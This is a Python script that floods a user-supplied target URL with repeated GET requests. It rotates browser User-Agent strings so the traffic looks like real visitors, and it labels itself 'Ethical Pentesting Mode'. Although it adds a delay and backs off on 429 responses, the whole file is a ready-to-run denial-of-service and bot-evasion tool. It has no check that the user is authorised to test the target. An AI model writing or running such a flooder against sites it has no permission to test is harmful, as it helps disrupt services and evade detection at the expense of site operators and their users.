import requests
import random
import time

# List of User-Agents to mimic real browsers
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/537.36"
]

# Get URL from user
url = input("Enter Target URL (with http:// or https://): ")

# Number of requests
num_requests = int(input("Enter number of requests to send: "))

# Delay between requests (to prevent server crashes)
delay = float(input("Enter delay between requests (seconds): "))

print("\n[+] Starting HTTP Request Flood (Ethical Pentesting Mode)")
time.sleep(2)

sent = 0
for i in range(num_requests):
    headers = {
        "User-Agent": random.choice(user_agents)  # Rotate user agents
    }

    try:
        response = requests.get(url, headers=headers, timeout=5)  # Send request
        sent += 1
        print(f"[{sent}] Sent request to {url} - Status: {response.status_code}")

        if response.status_code == 429:
            print("[!] Rate limit detected! Slowing down...")
            time.sleep(5)  # Slow down if rate limited

    except requests.exceptions.RequestException as e:
        print(f"[ERROR] Request failed: {e}")

    time.sleep(delay)  # Delay between requests

print("\n[+] Test Completed. Check responses for rate-limiting behavior.")
